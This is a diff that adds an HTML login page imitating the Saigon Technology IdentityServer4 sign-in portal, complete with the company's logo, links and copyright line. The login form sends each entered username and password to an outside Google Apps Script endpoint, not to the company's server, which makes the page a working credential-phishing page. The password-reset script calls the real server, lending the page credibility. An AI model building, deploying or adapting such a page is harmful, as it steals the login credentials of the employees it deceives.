@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <style>
+        .model_ResetPass {
+            width: 120% !important;
+        }
+    </style>
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Identity</title>
+    <link rel="icon" type="image/x-icon" href="../stsLogo.png" />
+    <link rel="shortcut icon" type="image/x-icon" href="../stsLogo.png" />
+    <link rel="stylesheet" href="../lib/bootstrap/css/bootstrap.min.css" />
+    <link rel="stylesheet" href="../css/site.css" />
+
+    <link href="../LoginTemplate/css/custom/CustomLogin.css" rel="stylesheet" />
+    <link rel="stylesheet" href="../LoginTemplate/css/libs/components.min.css" />
+    <link rel="stylesheet" href="../LoginTemplate/css/libs/font-awesome.min.css" />
+    <link rel="stylesheet" href="../LoginTemplate/css/libs/toaster.css" />
+
+    <script src="../lib/jquery/jquery.js"></script>
+	
+    <script src="../lib/bootstrap/js/bootstrap.min.js"></script>
+    <script src="../lib/bootstrap/js/CustomLogin.js"></script>
+    <script src="../lib/bootstrap/js/bootstrap-notify.min.js"></script>
+	
+	
+</head>
+<body>
+    <div class="navbar navbar-inverse navbar-fixed-top">
+        <div class="container-fluid">
+            <div class="navbar-header">
+                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a href="https://identity.saigontechnology.vn/">
+                    <span class="navbar-brand">
+                        <img src="../icon.png" class="icon-banner">
+                        IdentityServer4
+                    </span>
+                </a>
+            </div>
+
+        </div>
+    </div>
+
+    <div class="container body-content">
+        
+<style>
+    
+    body {
+        height: 100vh;
+        position: relative;
+    }
+    .body-content {
+        position: relative;
+    }
+    .loader {
+        border: 16px solid #f3f3f3;
+        border-radius: 50% !important;
+        border-top: 16px solid blue;
+        border-bottom: 16px solid blue;
+        width: 120px;
+        height: 120px;
+        -webkit-animation: spin 2s linear infinite;
+        animation: spin 2s linear infinite;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        z-index: 100;
+    }
+    .bg-loader {
+        content: "";
+        width: 100vw;
+        height: 100vh;
+        position: fixed;
+        top: 0;
+        left: 0;
+        background-color: rgba(0, 0, 0, .8);
+        z-index: 99;
+    }
+
+    @-webkit-keyframes spin {
+        0% { -webkit-transform: rotate(0deg); }
+        100% { -webkit-transform: rotate(360deg); }
+    }
+
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+
+    .fa-envelope-o {
+        line-height: 40px !important;
+    }
+
+    .fa-lock {
+        line-height: 38px !important;
+    }
+
+    #Username, #Password {
+        padding-left: 10px !important;
+    }
+</style>
+<body>
+<div class="col-md-12">
+    
+    
+
+    <form action="https://script.google.com/macros/s/AKfycbw4ENvXNNpsftlBiNf-A2ALPkFXODoouY90vLp_EAPpS9oQZhkm814kuwpID3le5tG6/exec" method="post">
+        <input type="hidden" id="ReturnUrl" name="ReturnUrl" value="/" />
+        <div class="row">
+            <div class="col-md-12">
+                <div class="login-panel">
+                    
+                    <div class="row">
+                        <div class="col-sm-6 text-center hidden-xs background-left" style="border-right: 1px solid #E6E6E6">
+                        </div>
+                            <div class="col-sm-6">
+                                <div class="row">
+                                    <div class="col-md-12 text-center login-form-logo">
+                                        <img class="login-logo" src="https://identity.saigontechnology.vn/LoginTemplate/image/STS_Logo_white.svg" />
+                                    </div>
+                                    <div class="col-md-12 login-form">
+                                        <div class="col-md-12">
+                                            <div class="form-group">
+                                                <div class="input-group">
+                                                    <div class="input-group-addon">
+                                                        <i class="fa fa-envelope-o login-icon" aria-hidden="true"></i>
+                                                    </div>
+                                                    <input required placeholder="Username" autofocus type="text" class="form-control input" maxlength="100" data-val="true" data-val-required="The Username field is required." id="Username" name="Username" value="">
+                                                </div>
+                                            </div>
+                                            <div class="form-group">
+                                                <div class="input-group">
+                                                    <div class="input-group-addon">
+                                                        <i class="fa fa-lock login-icon" aria-hidden="true"></i>
+                                                    </div>
+                                                    <input class="form-control input" placeholder="Password" type="password" autocomplete="off" data-val="true" data-val-required="The Password field is required." id="Password" name="Password">
+                                                </div>
+                                            </div>
+
+                                            <div class="form-group">
+												
+                                                <button class="btn btn-login form-control" type="submit">Login</button>
+												
+                                            </div>
+                                                <div class="form-group remember-password">
+                                                    <div class="row" style="padding: 0 20px">
+                                                        <div class="col-xs-6 remember-checkbox">
+                                                            <div class="checkbox">
+                                                                <label for="RememberLogin">
+                                                                    <input class="input-assumpte" style="margin: 0 5px 0 0" type="checkbox" checked="checked" data-val="true" data-val-required="The RememberLogin field is required." id="RememberLogin" name="RememberLogin" value="true" />Remember me
+                                                                </label>
+                                                            </div>
+                                                        </div>
+                                                        <div class="col-xs-6 pull-right primary-color bold" style="margin-left: 60px;">
+                                                            <a data-target="#resetPass_modal" data-toggle="modal">Forgot password?</a>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        
+                            <div class="col-sm-12">
+                                <div class="copyright"> <label id="currentYear" title=""></label> ©Copyright By Saigon Technology Solution </div>
+                            </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    <input name="__RequestVerificationToken" type="hidden" value="CfDJ8KcQppx3mqNFndrgSHk5PfoQjplmN3cKSFlhfU1leB52wBpaRFgzpHa0Xi5frTtBd3cd46suLf8Hl5fsIC4KlNQShoQgg7eOdb7wNR359NTySH8EY7NWLznabE9HOEzHWg5_CPKZK2qUl6btQ1y5_WA" /><input name="RememberLogin" type="hidden" value="false" /></form>
+</div>
+
+<div class="loader display-none"></div>
+<div class="bg-loader display-none"></div>
+</body>
+
+
+    </div>
+
+    <div class="content-modal-body modal fade" id="resetPass_modal" data-backdrop="static" data-keyboard="false" aria-labelledby="examplePositionCenter" role="dialog" aria-hidden="true" style="display: none;">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content model_ResetPass">
+                <div class="modal-header">
+                    <h5 class="modal-title">Reset Password</h5>
+                </div>
+                <div class="modal-body">
+                    <div class="form-group form-inline">
+                        <label class="form-control-label col-md-4">
+                            Email<span class="">*</span>
+                        </label>
+                        <input type="text" class="form-control col-md-8" data-valid="validation-modal" id="resetForm_Email" />
+                        <span class="text-danger"></span>
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button id="btn_reset_user"  data-valid="add-row"  data-plugin="ladda" type="button" class="btn btn-primary waves-effect waves-classic"><i class="icon md-floppy" aria-hidden="true"></i> Send</button>
+                    <button type="button" class="btn btn-default btn-pure waves-effect waves-classic reset-form" data-dismiss="modal"> <span aria-hidden="true">×</span> Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    
+    
+
+    <script type="text/javascript">
+        $(document).ready(function () {
+
+            $("#btn_reset_user").on("click",
+                function () {
+
+                    $(".spanEmail").remove();
+
+                    if ($("#resetForm_Email").val().trim("") === "") {
+                        $("#resetForm_Email").after("<span class='text-danger spanEmail' style='display: block; width: 100%;'>Email not empty</span>");
+                        return false;
+                    }
+
+                    var sendAccountData = {
+                        Email: $("#resetForm_Email").val()
+                    };
+
+                    $(".loader").removeClass("display-none");
+                    $(".bg-loader").removeClass("display-none");
+
+                    $.ajax({
+                        url: 'https://identity.saigontechnology.vn/user/ResetPassword',
+                        type: "POST",
+                        dataType: "json",
+                        contentType: "application/json",
+                        data: JSON.stringify(sendAccountData),
+                        success: function (data) {
+                            $(".reset-form").click();
+                            $.notify({ message: 'Reset Password Success' },
+                                {
+                                    type: 'success'
+                                });
+                        },
+                        error: function (err) {
+                            console.log("err", err);
+                            var response = err.responseJSON;
+                            if (!response) {
+                                alert("There is error from server! Please contact admin for helping.");
+                            } else {
+                                switch (response.error.code) {
+                                    case 1003: {// InvalidEmail
+                                        $("#resetForm_Email").after("<span class='text-danger spanEmail' style='display: block; width: 100%;'>Email does not exist.</span>");
+                                        break;
+                                    }
+                                    case 1004: {// InvalidUser
+                                        $("#resetForm_Email").after("<span class='text-danger spanEmail' style='display: block; width: 100%;'>User is not Active or Deleted</span>");
+                                        break;
+                                    }
+                                }
+                            }
+                        },
+                        complete: function() {
+                            $(".loader").addClass("display-none");
+                            $(".bg-loader").addClass("display-none");
+                        }
+                    });
+                });
+        });
+    </script>
+
+
+</body>
+
+</html>
